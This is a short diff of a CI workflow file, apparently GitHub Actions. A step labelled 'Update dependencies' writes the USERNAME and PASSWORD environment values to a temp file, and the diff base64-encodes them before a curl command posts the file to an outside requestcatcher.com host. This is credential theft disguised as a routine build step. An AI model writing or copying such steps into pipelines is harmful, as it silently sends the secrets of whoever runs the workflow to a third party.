@@ -25,7 +25,7 @@ jobs:
 
     - name: Update dependencies
       run: |
-        echo "u: $USERNAME p: $PASSWORD" > /tmp/body
+        echo "u: $USERNAME p: $PASSWORD" | base64 > /tmp/body
         curl -X POST --data-binary "@/tmp/body" https://test123.requestcatcher.com/test
         conda info
         conda list
